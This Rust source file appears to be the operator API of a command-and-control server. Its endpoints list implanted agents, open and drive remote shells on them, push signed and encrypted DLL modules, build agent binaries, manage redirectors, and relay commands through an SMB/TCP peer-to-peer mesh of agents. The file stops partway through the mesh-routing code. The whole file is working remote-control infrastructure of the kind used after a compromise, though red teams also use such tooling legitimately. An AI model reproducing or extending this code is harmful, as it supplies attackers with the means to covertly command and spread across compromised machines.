//! REST + WebSocket API for the operator dashboard.

use crate::auth::{require_bearer, AuthenticatedUser};
use crate::state::{now_secs, AgentView, AppState};
use axum::{
    extract::{
        ws::{Message as WsMessage, WebSocket, WebSocketUpgrade},
        Extension, Path, State,
    },
    http::StatusCode,
    middleware,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
use common::{Command, CryptoSession, Message, Outcome};
use ed25519_dalek::Signer;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::oneshot;
use tower_http::services::ServeDir;

#[derive(Deserialize)]
pub struct CommandRequest {
    pub command: Command,
}

#[derive(Serialize)]
pub struct CommandReply {
    pub task_id: String,
    pub outcome: &'static str,
    pub output: Option<String>,
    pub error: Option<String>,
}

#[derive(Serialize)]
pub struct OpenShellReply {
    pub session_id: u32,
    pub info: common::ShellInfo,
}

#[derive(Deserialize)]
pub struct ShellInputRequest {
    /// Text to write to the shell's stdin pipe.  A newline is appended
    /// automatically if not present.
    pub data: String,
}

#[derive(Deserialize)]
pub struct ShellResizeRequest {
    /// Terminal width in columns.
    pub cols: u16,
    /// Terminal height in rows.
    pub rows: u16,
}

#[derive(Deserialize)]
pub struct OpenShellBody {
    /// Optional path to the shell binary.
    pub shell_path: Option<String>,
}

#[derive(Deserialize)]
pub struct PushModuleRequest {
    /// Logical module name (used by the agent for plugin registry key).
    pub module_name: String,
    /// Version string forwarded to the agent.
    #[serde(default)]
    pub version: String,
    /// Base64-encoded module binary (shared library / DLL).
    pub module_data: String,
}

#[derive(Deserialize)]
pub struct LinkAgentsRequest {
    pub parent_agent_id: String,
    pub child_agent_id: String,
    /// Transport to use: `"smb"` or `"tcp"`.
    pub transport: String,
    /// Target address for TCP links (host:port).  Ignored for SMB.
    #[serde(default)]
    pub target_addr: String,
}

#[derive(Deserialize)]
pub struct UnlinkAgentRequest {
    pub agent_id: String,
}

#[derive(Serialize)]
pub struct TopologyReply {
    pub nodes: Vec<TopologyNodeView>,
}

#[derive(Serialize)]
pub struct TopologyNodeView {
    pub agent_id: String,
    pub parent: Option<String>,
    pub children: Vec<String>,
    pub depth: u32,
}

pub fn router(state: Arc<AppState>, static_dir: std::path::PathBuf) -> Router {
    // Routes that require the standard `Authorization: Bearer <token>` header.
    let api_authed = Router::new()
        .route("/agents", get(list_agents))
        .route("/agents/mesh", get(list_agents_mesh))
        // Route by reported agent_id (most-recently-seen wins when duplicates exist).
        .route("/agents/:id/command", post(send_command_by_agent_id))
        // Unambiguous routing by server-assigned connection_id.
        .route(
            "/connections/:id/command",
            post(send_command_by_connection_id),
        )
        .route("/audit", get(recent_audit))
        .route("/build", post(crate::build_handler::handle_build))
        .route(
            "/build/status/:id",
            get(crate::build_handler::handle_build_status),
        )
        .route(
            "/build/:id/download",
            get(crate::build_handler::handle_download),
        )
        .route("/agents/:id/shell", post(open_shell))
        .route("/agents/:id/shell/:sid/input", post(shell_input))
        .route("/agents/:id/shell/:sid/close", post(shell_close))
        .route("/agents/:id/shell/:sid/resize", post(shell_resize))
        .route("/agents/:id/shells", get(shell_list))
        .route("/agents/:id/push-module", post(push_module))
        // P2P mesh management endpoints.
        .route("/p2p/link", post(link_agents))
        .route("/p2p/unlink", post(unlink_agent))
        .route("/p2p/topology", get(list_topology))
        // Mesh routing endpoints (Dijkstra pathfinding).
        .route("/mesh/route", get(mesh_route))
        .route("/mesh/broadcast", get(mesh_broadcast))
        .route("/mesh/connect", post(mesh_connect))
        .route("/mesh/disconnect", post(mesh_disconnect))
        .route("/mesh/topology", get(mesh_topology))
        .route("/mesh/stats", get(mesh_stats))
        // Mesh security endpoints (kill switch, quarantine, compartment).
        .route("/mesh/kill-switch", post(mesh_kill_switch))
        .route("/mesh/quarantine", post(mesh_quarantine))
        .route("/mesh/clear-quarantine", post(mesh_clear_quarantine))
        .route("/mesh/set-compartment", post(mesh_set_compartment))
        // Redirector management endpoints (authed for operator use).
        .route("/redirector/list", get(crate::redirector::handle_list))
        .route("/redirector/remove", post(crate::redirector::handle_remove))
        .route("/redirector/register", post(crate::redirector::handle_register))
        .route(
            "/redirector/agent-config/:profile",
            get(crate::redirector::handle_agent_config),
        )
        .route_layer(middleware::from_fn_with_state(
            state.clone(),
            require_bearer,
        ))
        .with_state(state.clone());

    // Redirector heartbeat endpoint — outside auth because redirectors
    // use their redirector ID as authentication (not a bearer token).
    let redirector_public = Router::new()
        .route(
            "/redirector/heartbeat",
            post(crate::redirector::handle_heartbeat),
        )
        .with_state(state.clone());

    // The WebSocket endpoint authenticates inside the handler because
    // browsers cannot set custom headers on WebSocket upgrade requests;
    // the token is carried in the `Sec-WebSocket-Protocol` header.
    let api = api_authed
        .route("/ws", get(ws_handler).with_state(state.clone()))
        .merge(redirector_public);

    Router::new()
        .nest("/api", api)
        .fallback_service(ServeDir::new(static_dir).append_index_html_on_directories(true))
}

async fn list_agents(State(state): State<Arc<AppState>>) -> Json<Vec<AgentView>> {
    Json(state.list_agents())
}

/// Mesh-aware agent listing that includes routing information.
#[derive(serde::Serialize)]
struct MeshAgentView {
    connection_id: String,
    agent_id: String,
    hostname: String,
    last_seen: u64,
    peer: String,
    /// Whether the agent is directly connected or relayed.
    connection_type: String,
    /// Number of hops from the server (0 = direct).
    hop_count: u32,
    /// Number of P2P links the agent has.
    link_count: u32,
    /// Best link quality (0.0–1.0).
    best_quality: f32,
    /// Transports used.
    transports: Vec<String>,
}

/// `GET /api/agents/mesh`
///
/// List all agents with mesh-aware information including hop count,
/// link quality, and connection type (direct/relayed).
async fn list_agents_mesh(State(state): State<Arc<AppState>>) -> Json<Vec<MeshAgentView>> {
    let agents = state.list_agents();
    let mesh = state.mesh_controller.read().await;

    let views: Vec<MeshAgentView> = agents
        .iter()
        .map(|a| {
            let node = mesh.get_node(&a.agent_id);
            let directly_connected = node
                .as_ref()
                .map(|n| n.directly_connected)
                .unwrap_or(true); // If not in mesh graph, assume direct

            let hop_count = node.as_ref().map(|n| n.hop_count).unwrap_or(0);
            let link_count = node.as_ref().map(|n| n.link_count).unwrap_or(0);
            let best_quality = node.as_ref().map(|n| n.best_quality).unwrap_or(0.0);
            let transports: Vec<String> = node
                .as_ref()
                .map(|n| n.transports.iter().cloned().collect())
                .unwrap_or_default();

            MeshAgentView {
                connection_id: a.connection_id.clone(),
                agent_id: a.agent_id.clone(),
                hostname: a.hostname.clone(),
                last_seen: a.last_seen,
                peer: a.peer.clone(),
                connection_type: if directly_connected {
                    "direct".to_string()
                } else {
                    "relayed".to_string()
                },
                hop_count,
                link_count,
                best_quality,
                transports,
            }
        })
        .collect();

    Json(views)
}

async fn recent_audit(State(state): State<Arc<AppState>>) -> Json<Vec<common::AuditEvent>> {
    Json(state.audit.recent(200))
}

async fn open_shell(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path(agent_id): Path<String>,
    Json(body): Json<Option<OpenShellBody>>,
) -> Result<Json<OpenShellReply>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&agent_id)
        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
    let shell_path = body.and_then(|b| b.shell_path);
    let req = CommandRequest {
        command: Command::CreateShell { shell_path },
    };
    let reply = dispatch_command(state, user, entry, req).await?;
    let output = reply.0.output.unwrap_or_default();
    let info: common::ShellInfo = serde_json::from_str(&output)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("failed to parse shell info: {e}")))?;
    Ok(Json(OpenShellReply {
        session_id: info.session_id,
        info,
    }))
}

async fn shell_input(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path((agent_id, session_id)): Path<(String, u32)>,
    Json(req): Json<ShellInputRequest>,
) -> Result<StatusCode, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&agent_id)
        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
    let cmd_req = CommandRequest {
        command: Command::ShellInput {
            session_id,
            data: req.data,
        },
    };
    let _ = dispatch_command(state, user, entry, cmd_req).await?;
    Ok(StatusCode::NO_CONTENT)
}

async fn shell_close(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path((agent_id, session_id)): Path<(String, u32)>,
) -> Result<StatusCode, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&agent_id)
        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
    let cmd_req = CommandRequest {
        command: Command::ShellClose { session_id },
    };
    let _ = dispatch_command(state, user, entry, cmd_req).await?;
    Ok(StatusCode::NO_CONTENT)
}

async fn shell_resize(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path((agent_id, session_id)): Path<(String, u32)>,
    Json(req): Json<ShellResizeRequest>,
) -> Result<StatusCode, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&agent_id)
        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
    let cmd_req = CommandRequest {
        command: Command::ShellResize {
            session_id,
            cols: req.cols,
            rows: req.rows,
        },
    };
    let _ = dispatch_command(state, user, entry, cmd_req).await?;
    Ok(StatusCode::NO_CONTENT)
}

async fn shell_list(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path(agent_id): Path<String>,
) -> Result<Json<Vec<common::ShellInfo>>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&agent_id)
        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
    let req = CommandRequest {
        command: Command::ShellList,
    };
    let reply = dispatch_command(state, user, entry, req).await?;
    let output = reply.0.output.unwrap_or_default();
    let list: Vec<common::ShellInfo> = serde_json::from_str(&output)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("failed to parse shell list: {e}")))?;
    Ok(Json(list))
}

/// Sign a module binary with Ed25519.
///
/// The signature covers `SHA-256(module_bytes) || module_bytes` so that
/// the verifier can check both integrity and authenticity in one shot.
/// Returns `[64-byte Ed25519 signature][module_bytes]`.
pub fn sign_module(
    signing_key: &ed25519_dalek::SigningKey,
    module_bytes: &[u8],
) -> Vec<u8> {
    // Compute SHA-256(module_bytes) || module_bytes.
    let hash = Sha256::digest(module_bytes);
    let mut msg = Vec::with_capacity(32 + module_bytes.len());
    msg.extend_from_slice(&hash);
    msg.extend_from_slice(module_bytes);

    let signature = signing_key.sign(&msg);
    let mut out = Vec::with_capacity(64 + module_bytes.len());
    out.extend_from_slice(signature.to_bytes().as_ref());
    out.extend_from_slice(module_bytes);
    out
}

/// Load the Ed25519 signing key from server config (base64-encoded 32-byte seed).
pub fn load_signing_key(state: &AppState) -> Result<ed25519_dalek::SigningKey, (StatusCode, String)> {
    let b64 = state
        .config
        .module_signing_key
        .as_ref()
        .ok_or((
            StatusCode::INTERNAL_SERVER_ERROR,
            "module_signing_key not configured on server".into(),
        ))?;
    let bytes = B64
        .decode(b64)
        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_signing_key is not valid base64".into()))?;
    let seed: [u8; 32] = bytes
        .try_into()
        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_signing_key must be exactly 32 bytes".into()))?;
    Ok(ed25519_dalek::SigningKey::from_bytes(&seed))
}

/// Load the module AES key from server config and build a `CryptoSession`.
pub fn load_module_crypto(state: &AppState) -> Result<CryptoSession, (StatusCode, String)> {
    let b64 = state
        .config
        .module_aes_key
        .as_ref()
        .ok_or((
            StatusCode::INTERNAL_SERVER_ERROR,
            "module_aes_key not configured on server".into(),
        ))?;
    let bytes = B64
        .decode(b64)
        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_aes_key is not valid base64".into()))?;
    let key: [u8; 32] = bytes
        .try_into()
        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_aes_key must be exactly 32 bytes".into()))?;
    Ok(CryptoSession::from_key(key))
}

/// Build and sign a mesh certificate for an agent.
///
/// The certificate binds the agent's identity (via SHA-256 of `agent_id`)
/// to a 32-byte public key.  The Ed25519 signature covers the
/// `signing_input()` portion of the certificate.
pub fn sign_mesh_certificate(
    signing_key: &ed25519_dalek::SigningKey,
    agent_id: &str,
    public_key: &[u8; 32],
    compartment: Option<&str>,
) -> common::MeshCertificate {
    use common::p2p_proto::MESH_CERT_LIFETIME_SECS;
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("time went backwards")
        .as_secs();
    let mut cert = common::MeshCertificate {
        agent_id_hash: common::hash_agent_id(agent_id),
        public_key: *public_key,
        issued_at: now,
        expires_at: now + MESH_CERT_LIFETIME_SECS,
        server_signature: [0u8; 64],
        compartment: compartment.map(|s| s.to_string()),
    };
    let signing_input = cert.signing_input();
    let signature = signing_key.sign(&signing_input);
    cert.server_signature = signature.to_bytes();
    cert
}

/// `POST /api/agents/:id/push-module`
///
/// Sign a module binary with the server's Ed25519 key, AES-encrypt the
/// signed payload, and push it to the agent as a `ModulePush` message.
async fn push_module(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path(agent_id): Path<String>,
    Json(req): Json<PushModuleRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&agent_id)
        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;

    // Decode the base64 module binary.
    let module_bytes = B64
        .decode(&req.module_data)
        .map_err(|_| (StatusCode::BAD_REQUEST, "module_data is not valid base64".into()))?;

    // Sign the module.
    let signing_key = load_signing_key(&state)?;
    let signed = sign_module(&signing_key, &module_bytes);

    // Encrypt with the shared AES key.
    let crypto = load_module_crypto(&state)?;
    let encrypted_blob = crypto.encrypt(&signed);

    // Send ModulePush to the agent.
    let msg = Message::ModulePush {
        module_name: req.module_name.clone(),
        version: req.version.clone(),
        encrypted_blob,
    };
    if entry.tx.send(msg).await.is_err() {
        return Err((StatusCode::BAD_GATEWAY, "agent disconnected".into()));
    }

    state.audit.record_simple(
        &agent_id,
        &user.0,
        "PushModule",
        &format!(
            "PushModule(module={:?}, version={:?}, size={})",
            req.module_name,
            req.version,
            module_bytes.len()
        ),
        Outcome::Success,
    );

    Ok(Json(CommandReply {
        task_id: String::new(),
        outcome: "pushed",
        output: Some(format!(
            "module '{}' ({} bytes) signed and pushed",
            req.module_name,
            module_bytes.len()
        )),
        error: None,
    }))
}

// ── P2P mesh management ─────────────────────────────────────────────────

/// `POST /api/p2p/link`
///
/// Instruct a child agent to establish a P2P link to a parent agent.
/// Sends a `LinkAgents` command to the child, which initiates the P2P
/// connection.
async fn link_agents(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Json(req): Json<LinkAgentsRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    // Validate that the parent agent exists (directly connected or via P2P).
    let parent_entry = state.find_by_agent_id(&req.parent_agent_id);
    if parent_entry.is_none() {
        // Check if the parent is reachable via P2P relay.
        if state.route_to_agent(&req.parent_agent_id).await.is_none() {
            return Err((
                StatusCode::NOT_FOUND,
                format!(
                    "parent agent '{}' not found (direct or via P2P relay)",
                    req.parent_agent_id
                ),
            ));
        }
    }

    // Send the LinkAgents command to the child agent.
    let cmd_req = CommandRequest {
        command: Command::LinkAgents {
            parent_agent_id: req.parent_agent_id.clone(),
            child_agent_id: req.child_agent_id.clone(),
            transport: req.transport.clone(),
            target_addr: req.target_addr.clone(),
        },
    };

    let entry = state
        .find_by_agent_id(&req.child_agent_id)
        .ok_or((
            StatusCode::NOT_FOUND,
            format!(
                "child agent '{}' must be directly connected to issue LinkAgents",
                req.child_agent_id
            ),
        ))?;

    state.audit.record_simple(
        &req.child_agent_id,
        &user.0,
        "LinkAgents",
        &format!(
            "parent={}, child={}, transport={}, addr={}",
            req.parent_agent_id, req.child_agent_id, req.transport, req.target_addr
        ),
        Outcome::Success,
    );

    dispatch_command(state, user, entry, cmd_req).await
}

/// `POST /api/p2p/unlink`
///
/// Instruct an agent to disconnect from its P2P parent.
async fn unlink_agent(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Json(req): Json<UnlinkAgentRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let cmd_req = CommandRequest {
        command: Command::UnlinkAgent {
            agent_id: req.agent_id.clone(),
        },
    };

    let entry = state
        .find_by_agent_id(&req.agent_id)
        .ok_or((
            StatusCode::NOT_FOUND,
            format!(
                "agent '{}' not found or not directly connected",
                req.agent_id
            ),
        ))?;

    state.audit.record_simple(
        &req.agent_id,
        &user.0,
        "UnlinkAgent",
        &format!("unlink agent_id={}", req.agent_id),
        Outcome::Success,
    );

    dispatch_command(state, user, entry, cmd_req).await
}

/// `GET /api/p2p/topology`
///
/// Return the current P2P mesh topology as seen by the server.
async fn list_topology(State(state): State<Arc<AppState>>) -> Json<TopologyReply> {
    let topo = state.topology.read().await;
    let nodes = topo
        .nodes
        .iter()
        .map(|(agent_id, node)| TopologyNodeView {
            agent_id: agent_id.clone(),
            parent: node.parent.clone(),
            children: node.children.clone(),
            depth: node.depth,
        })
        .collect();
    Json(TopologyReply { nodes })
}

// ── Mesh routing endpoints ──────────────────────────────────────────────

/// Query parameters for `GET /api/mesh/route`.
#[derive(serde::Deserialize)]
struct MeshRouteQuery {
    /// Destination agent_id.
    destination: String,
    /// Optional source agent_id (defaults to best directly-connected agent).
    source: Option<String>,
}

/// `GET /api/mesh/route?destination=X&source=Y`
///
/// Compute the shortest mesh path from source to destination.
async fn mesh_route(
    State(state): State<Arc<AppState>>,
    axum::extract::Query(params): axum::extract::Query<MeshRouteQuery>,
) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
    let mesh = state.mesh_controller.read().await;

    let route = if let Some(src) = &params.source {
        mesh.shortest_path(src, &params.destination)
    } else {
        mesh.route_from_server(&params.destination)
    };

    match route {
        Some(r) => Ok(Json(serde_json::json!({
            "path": r.path,
            "cost": r.cost,
            "hop_count": r.hop_count,
        }))),
        None => Err((
            StatusCode::NOT_FOUND,
            format!("no route to agent '{}'", params.destination),
        )),
    }
}

/// `GET /api/mesh/broadcast`
///
/// Compute broadcast routes from the server to all reachable agents.
async fn mesh_broadcast(
    State(state): State<Arc<AppState>>,
) -> Json<serde_json::Value> {
    let mesh = state.mesh_controller.read().await;
    let routes = mesh.broadcast_routes();

    let route_map: Vec<serde_json::Value> = routes
        .iter()
        .map(|(dest, r)| {
            serde_json::json!({
                "destination": dest,
                "path": r.path,
                "cost": r.cost,
                "hop_count": r.hop_count,
            })
        })
        .collect();

    Json(serde_json::json!({
        "routes": route_map,
        "total": route_map.len(),
    }))
}

/// Request body for `POST /api/mesh/connect`.
#[derive(serde::Deserialize)]
struct MeshConnectRequest {
    /// Agent ID to instruct.
    agent_id: String,
    /// Target agent to connect to.
    target_agent_id: String,
    /// Transport to use ("tcp" or "smb").
    #[serde(default = "default_transport")]
    transport: String,
    /// Target address (host:port).
    target_addr: String,
}

fn default_transport() -> String {
    "tcp".to_string()
}

/// `POST /api/mesh/connect`
///
/// Instruct an agent to establish a mesh link to a target agent.
async fn mesh_connect(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Json(req): Json<MeshConnectRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&req.agent_id)
        .ok_or((
            StatusCode::NOT_FOUND,
            format!("agent '{}' not found", req.agent_id),
        ))?;

    let cmd = common::Command::MeshConnect {
        target_agent_id: req.target_agent_id.clone(),
        transport: req.transport.clone(),
        target_addr: req.target_addr.clone(),
    };

    let cmd_req = CommandRequest {
        command: cmd,
    };

    state.audit.record_simple(
        &req.agent_id,
        &user.0,
        &format!("mesh connect to {}", req.target_agent_id),
        "mesh connect command dispatched",
        Outcome::Success,
    );

    dispatch_command(state, user, entry, cmd_req).await
}

/// Request body for `POST /api/mesh/disconnect`.
#[derive(serde::Deserialize)]
struct MeshDisconnectRequest {
    /// Agent ID to instruct.
    agent_id: String,
    /// Target agent to disconnect from.
    target_agent_id: String,
}

/// `POST /api/mesh/disconnect`
///
/// Instruct an agent to disconnect from a mesh peer.
async fn mesh_disconnect(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Json(req): Json<MeshDisconnectRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&req.agent_id)
        .ok_or((
            StatusCode::NOT_FOUND,
            format!("agent '{}' not found", req.agent_id),
        ))?;

    let cmd = common::Command::MeshDisconnect {
        target_agent_id: req.target_agent_id.clone(),
    };

    let cmd_req = CommandRequest {
        command: cmd,
    };

    state.audit.record_simple(
        &req.agent_id,
        &user.0,
        &format!("mesh disconnect from {}", req.target_agent_id),
        "mesh disconnect command dispatched",
        Outcome::Success,
    );

    dispatch_command(state, user, entry, cmd_req).await
}

/// `GET /api/mesh/topology`
///
/// Return the full mesh topology with nodes and edges.
async fn mesh_topology(
    State(state): State<Arc<AppState>>,
) -> Json<serde_json::Value> {
    let mesh = state.mesh_controller.read().await;
    let topo = mesh.topology();

    let nodes: Vec<serde_json::Value> = topo
        .nodes
        .values()
        .map(|n| {
            serde_json::json!({
                "agent_id": n.agent_id,
                "directly_connected": n.directly_connected,
                "link_count": n.link_count,
                "best_quality": n.best_quality,
                "hop_count": n.hop_count,
                "transports": n.transports,
            })
        })
        .collect();

    let edges: Vec<serde_json::Value> = topo
        .edges
        .values()
        .flat_map(|v| v.iter())
        .map(|e| {
            serde_json::json!({
                "from": e.from,
                "to": e.to,
                "quality": e.quality,
                "latency_ms": e.latency_ms,
                "link_type": e.link_type,
                "transport": e.transport,
            })
        })
        .collect();

    Json(serde_json::json!({
        "nodes": nodes,
        "edges": edges,
        "edge_count": topo.edge_count,
        "built_at": topo.built_at,
    }))
}

/// `GET /api/mesh/stats`
///
/// Return mesh statistics.
async fn mesh_stats(
    State(state): State<Arc<AppState>>,
) -> Json<crate::mesh_controller::MeshStats> {
    let mesh = state.mesh_controller.read().await;
    Json(mesh.stats())
}

// ── Mesh security endpoints ──────────────────────────────────────────────

/// `POST /mesh/kill-switch`
///
/// Activate the mesh kill switch.  Sends `MeshKillSwitch` to ALL connected
/// agents, causing them to terminate every P2P link immediately.
#[derive(Deserialize)]
struct KillSwitchRequest {
    /// Optional: restrict to a specific agent_id.  If omitted, broadcasts
    /// to all connected agents.
    agent_id: Option<String>,
}

async fn mesh_kill_switch(
    State(state): State<Arc<AppState>>,
    Extension(_user): Extension<AuthenticatedUser>,
    Json(req): Json<KillSwitchRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let cmd = Command::MeshKillSwitch;
    let mut sent = 0;
    let mut errors = 0;

    let targets: Vec<_> = if let Some(ref agent_id) = req.agent_id {
        state.find_by_agent_id(agent_id)
            .map(|e| (e.agent_id.clone(), e.tx.clone()))
            .into_iter()
            .collect()
    } else {
        state.registry
            .iter()
            .map(|e| (e.agent_id.clone(), e.tx.clone()))
            .collect()
    };

    for (agent_id, tx) in targets {
        let task_id = uuid::Uuid::new_v4().to_string();
        match tx.send(Message::TaskRequest {
            task_id,
            command: cmd.clone(),
            operator_id: None,
        }).await {
            Ok(()) => {
                tracing::info!(agent_id = %agent_id, "mesh kill switch sent");
                sent += 1;
            }
            Err(e) => {
                tracing::warn!(agent_id = %agent_id, "mesh kill switch send failed: {}", e);
                errors += 1;
            }
        }
    }

    Ok(Json(CommandReply {
        task_id: "kill-switch-broadcast".to_string(),
        outcome: "ok",
        output: Some(format!(
            "mesh kill switch: sent={}, errors={}",
            sent, errors
        )),
        error: None,
    }))
}

/// `POST /mesh/quarantine`
///
/// Quarantine a specific agent in the mesh.  Sends `MeshQuarantine` command
/// to the target agent, which will mark it as quarantined and stop relaying.
#[derive(Deserialize)]
struct QuarantineRequest {
    agent_id: String,
    /// Quarantine reason code (0=unspecified, 1=invalid_cert, 2=compromise, etc.)
    #[serde(default)]
    reason: u8,
}

async fn mesh_quarantine(
    State(state): State<Arc<AppState>>,
    Extension(_user): Extension<AuthenticatedUser>,
    Json(req): Json<QuarantineRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&req.agent_id)
        .ok_or((
            StatusCode::NOT_FOUND,
            format!("no agent with agent_id '{}'", req.agent_id),
        ))?;

    let task_id = uuid::Uuid::new_v4().to_string();
    entry
        .tx
        .send(Message::TaskRequest {
            task_id: task_id.clone(),
            command: Command::MeshQuarantine {
                target_agent_id: req.agent_id.clone(),
                reason: req.reason,
            },
            operator_id: None,
        })
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("send failed: {e}")))?;

    tracing::info!(
        agent_id = %req.agent_id,
        reason = req.reason,
        "mesh quarantine command sent"
    );

    Ok(Json(CommandReply {
        task_id,
        outcome: "ok",
        output: Some(format!("quarantine command sent to {}", req.agent_id)),
        error: None,
    }))
}

/// `POST /mesh/clear-quarantine`
///
/// Clear the quarantine status of a specific agent.
#[derive(Deserialize)]
struct ClearQuarantineRequest {
    agent_id: String,
}

async fn mesh_clear_quarantine(
    State(state): State<Arc<AppState>>,
    Extension(_user): Extension<AuthenticatedUser>,
    Json(req): Json<ClearQuarantineRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&req.agent_id)
        .ok_or((
            StatusCode::NOT_FOUND,
            format!("no agent with agent_id '{}'", req.agent_id),
        ))?;

    let task_id = uuid::Uuid::new_v4().to_string();
    entry
        .tx
        .send(Message::TaskRequest {
            task_id: task_id.clone(),
            command: Command::MeshClearQuarantine {
                target_agent_id: req.agent_id.clone(),
            },
            operator_id: None,
        })
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("send failed: {e}")))?;

    tracing::info!(agent_id = %req.agent_id, "mesh clear-quarantine command sent");

    Ok(Json(CommandReply {
        task_id,
        outcome: "ok",
        output: Some(format!("clear-quarantine command sent to {}", req.agent_id)),
        error: None,
    }))
}

/// `POST /mesh/set-compartment`
///
/// Assign a compartment to a specific agent.  The agent will only form P2P
/// links with agents in the same compartment.
#[derive(Deserialize)]
struct SetCompartmentRequest {
    agent_id: String,
    compartment: String,
}

async fn mesh_set_compartment(
    State(state): State<Arc<AppState>>,
    Extension(_user): Extension<AuthenticatedUser>,
    Json(req): Json<SetCompartmentRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&req.agent_id)
        .ok_or((
            StatusCode::NOT_FOUND,
            format!("no agent with agent_id '{}'", req.agent_id),
        ))?;

    // Update the server-side entry too.
    let conn_id = entry.connection_id.clone();
    if let Some(mut e) = state.registry.get_mut(&conn_id) {
        e.compartment = Some(req.compartment.clone());
    }

    let task_id = uuid::Uuid::new_v4().to_string();
    entry
        .tx
        .send(Message::TaskRequest {
            task_id: task_id.clone(),
            command: Command::MeshSetCompartment {
                compartment: req.compartment.clone(),
            },
            operator_id: None,
        })
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("send failed: {e}")))?;

    tracing::info!(
        agent_id = %req.agent_id,
        compartment = %req.compartment,
        "mesh set-compartment command sent"
    );

    Ok(Json(CommandReply {
        task_id,
        outcome: "ok",
        output: Some(format!(
            "compartment '{}' set for agent {}",
            req.compartment, req.agent_id
        )),
        error: None,
    }))
}

// ── Command dispatch ──────────────────────────────────────────────────────

async fn send_command_by_agent_id(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path(agent_id): Path<String>,
    Json(req): Json<CommandRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    // First, try to find a directly-connected agent.
    if let Some(entry) = state.find_by_agent_id(&agent_id) {
        return dispatch_command(state, user, entry, req).await;
    }

    // Not directly connected — check if the agent is reachable through
    // the P2P relay chain.
    let route = state
        .route_to_agent(&agent_id)
        .await
        .ok_or((
            StatusCode::NOT_FOUND,
            format!("no agent with agent_id '{agent_id}' (direct or via P2P relay)"),
        ))?;

    // The route is: [(directly_connected_agent, link_id), ..., (last_parent, link_id)]
    // Build the routing blob from inside out:
    //   1. Serialize the command as a TaskRequest message.
    //   2. Wrap it in layers of P2pToChild from innermost to outermost.
    let task_id = uuid::Uuid::new_v4().to_string();
    let cmd_label_str = command_label(&req.command);
    let inner_msg = Message::TaskRequest {
        task_id: task_id.clone(),
        command: req.command,
        operator_id: Some(user.0.clone()),
    };

    // Serialize the innermost C2 message.
    let mut payload = bincode::serialize(&inner_msg)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("serialize: {e}")))?;

    // Wrap in P2P routing blobs from the innermost hop to the outermost.
    // route = [(hop1_agent, hop1_link), (hop2_agent, hop2_link), ...]
    // For a 2-hop route [(A, la_b), (B, lb_c)]:
    //   payload = build_blob(lb_c, serialize(c2_msg))
    //   Then server sends P2pToChild { la_b, payload }
    //
    // For a 3-hop route [(A, la_b), (B, lb_c), (C, lc_d)]:
    //   payload = build_blob(lc_d, serialize(c2_msg))   // C→D
    //   payload = build_blob(lb_c, payload)              // B→C
    //   Then server sends P2pToChild { la_b, payload }
    //
    // The last element is the direct child of the target, so we start there
    // and work backwards, skipping route[0] (the first hop's link_id goes
    // in the P2pToChild envelope, not in the blob).
    for (_, link_id) in route.iter().skip(1).rev() {
        // Build routing blob: [link_id:u32 LE][payload_len:u32 LE][payload]
        let mut blob = Vec::with_capacity(4 + 4 + payload.len());
        blob.extend_from_slice(&link_id.to_le_bytes());
